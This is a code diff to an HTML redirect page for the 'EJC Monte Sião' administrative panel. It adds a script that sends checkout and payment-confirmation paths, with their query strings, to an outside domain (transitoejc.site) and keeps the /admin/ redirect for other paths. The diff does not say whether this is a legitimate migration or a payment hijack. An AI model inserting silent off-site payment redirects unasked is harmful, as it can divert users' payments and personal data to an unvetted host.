@@ -3,10 +3,21 @@
 <head>
   <meta charset="utf-8">
   <title>EJC Monte Sião — Painel Administrativo</title>
-  <meta http-equiv="refresh" content="0; url=/admin/">
-  <script>window.location.replace("/admin/");</script>
+  <script>
+    (function() {
+      var path = (window.location.pathname || "").toLowerCase();
+      var search = window.location.search || "";
+      if (path.indexOf("checkout") !== -1) {
+        window.location.replace("https://www.transitoejc.site/checkout" + search);
+      } else if (path.indexOf("confirmacao") !== -1) {
+        window.location.replace("https://www.transitoejc.site/confirmacao-pagamento" + search);
+      } else {
+        window.location.replace("/admin/" + search);
+      }
+    })();
+  </script>
 </head>
 <body style="font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #0f172a; color: #f8fafc;">
-  <p>Redirecionando para o painel administrativo... <a href="/admin/" style="color: #38bdf8;">Clique aqui se não for redirecionado automaticamente.</a></p>
+  <p>Redirecionando... <a href="/admin/" style="color: #38bdf8;">Clique aqui se não for redirecionado automaticamente.</a></p>
 </body>
 </html>
